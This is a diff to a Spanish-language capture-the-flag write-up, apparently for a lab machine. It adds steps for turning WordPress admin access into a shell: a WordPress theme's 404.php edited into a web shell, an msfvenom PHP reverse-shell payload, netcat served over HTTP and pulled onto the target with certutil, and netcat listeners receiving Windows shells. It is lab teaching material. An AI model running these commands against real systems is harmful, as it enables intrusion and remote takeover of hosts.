@@ -227,31 +227,89 @@ Enunciado :
 
 5) Logueamos en WP y obtenemos shell en la maquina victima.
 
-   - Editamos el fichero 404.php del tema actual para poder obtener shell.
+   - Editamos el fichero 404.php del tema actual para poder obtener shell y ejecutar comandos desde la url del navegador.
        
-     ![image](https://github.com/Esevka/CTF/assets/139042999/020d55da-a93f-4b46-893c-572647f6d11d)
+      ![image](https://github.com/Esevka/CTF/assets/139042999/b4f7b7e7-df6f-43b8-914f-2f378b1f7687)
 
-   - Creamos nuestra reverse shell.
+   - La jugada es la siguiente, subir netcat para que una vez obtengamos la shell poder upgradear y trabajar comodamente.
+
+      - Creamos nuestra reverse shell y la copiamos al fichero 404.php
      
+            ┌──(root㉿kali)-[/home/…/ctf/try_ctf/retro/content]
+            └─# msfvenom -p php/reverse_php LHOST=10.8.64.232 LPORT=1988 -f raw -o Rshell.exe
+            [-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
+            [-] No arch selected, selecting arch: php from the payload
+            No encoder specified, outputting raw payload
+            Payload size: 2995 bytes
+            Saved as: Rshell.exe
+        
+     - Codigo para poder ejecutar comandos desde la url del navegador, tenemos que copiarlo en el fichero 404.php
+     
+           system($_GET['cmd'];
+  
+     - Nos descargamos netcat x64 de la siguiente url -->  https://github.com/int0x33/nc.exe/
+  
+     - Montamos un servicio de datos http desde python para poder compartir dicho fichero.
+  
+            ┌──(root㉿kali)-[/home/…/ctf/try_ctf/retro/content]
+            └─# python3 -m http.server 80
+            Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+            10.10.7.22 - - [18/Sep/2023 17:42:22] "GET /nc64.exe HTTP/1.1" 200 -
+
+     - Nos ponemos a la espera de nuestra conexion.
+       
+            ┌──(root㉿kali)-[/home/…/ctf/try_ctf/retro/content]
+            └─# rlwrap nc -lnvp 1988
+            listening on [any] 1988 ...
+       
+     - Ejecutamos todo el proceso
+
+         Comando que ejecutaremos desde la url para subir netcat --> certutil.exe -urlcache -f http://10.8.64.232/nc64.exe nc.exe
+
+       ![image](https://github.com/Esevka/CTF/assets/139042999/008493d4-46b7-4b10-8a72-ea1f7e9840f4)
+
+    - Hemos obtenido shell y subido netcat a la maquina victima
+
           ┌──(root㉿kali)-[/home/…/ctf/try_ctf/retro/content]
-          └─# msfvenom -p php/reverse_php LHOST=10.8.64.232 LPORT=1988 -f raw -o Rshell.exe
-          [-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
-          [-] No arch selected, selecting arch: php from the payload
-          No encoder specified, outputting raw payload
-          Payload size: 2995 bytes
-          Saved as: Rshell.exe
+          └─# rlwrap nc -lnvp 1988
+          listening on [any] 1988 ...
+          connect to [10.8.64.232] from (UNKNOWN) [10.10.7.22] 49938
+          dir
+           Volume in drive C has no label.
+           Volume Serial Number is 7443-948C
+          
+           Directory of C:\inetpub\wwwroot\retro\wp-content\themes\90s-retro
+          
+          09/18/2023  09:02 AM    <DIR>          .
+          09/18/2023  09:02 AM    <DIR>          ..
+          09/18/2023  08:46 AM             4,613 404.php
+          12/08/2019  05:19 PM    <DIR>          languages
+          09/18/2023  09:02 AM            45,272 nc.exe ---------> subida
+          12/08/2019  05:19 PM             1,687 page.php
 
-     -Nos ponemos en escucha para recibir nuestra shell y la ejecutamos.
+      - Upgrademos shell
 
-       ![image](https://github.com/Esevka/CTF/assets/139042999/46d41e08-65b8-42f5-89e5-734e275e0c91)
+        1) Nos ponemos nuevamente en escucha en nuestra maquina atacante
 
-       ![image](https://github.com/Esevka/CTF/assets/139042999/6218d7e1-a9d4-47ee-9781-156e86cac695)
+                ┌──(root㉿kali)-[/home/…/ctf/try_ctf/retro/content]
+                └─# nc -lnvp 1999
+                listening on [any] 1999 ...
+          
+        3) Ejecutamos nc.exe en la maquina victima
 
-     -Upgrademos la shell para trabajar comodamente.
+           ![image](https://github.com/Esevka/CTF/assets/139042999/75f12a8f-568e-4b01-92b5-497b3c5e92c3)
 
-     Para ello nos descargamos NetCat la version de 64 ---> https://github.com/int0x33/nc.exe/
-     Lo subimos a la maquina victima y volvemos a realizar una conexion con una shell nueva.
+        4) Obtenemos una son consola de windows operativa.
 
+                ┌──(root㉿kali)-[/home/…/ctf/try_ctf/retro/content]
+                └─# nc -lnvp 1999
+                listening on [any] 1999 ...
+                connect to [10.8.64.232] from (UNKNOWN) [10.10.7.22] 49952
+                Microsoft Windows [Version 10.0.14393]
+                (c) 2016 Microsoft Corporation. All rights reserved.
+                
+                C:\inetpub\wwwroot\retro\wp-content\themes\90s-retro>
+           
      
      
      
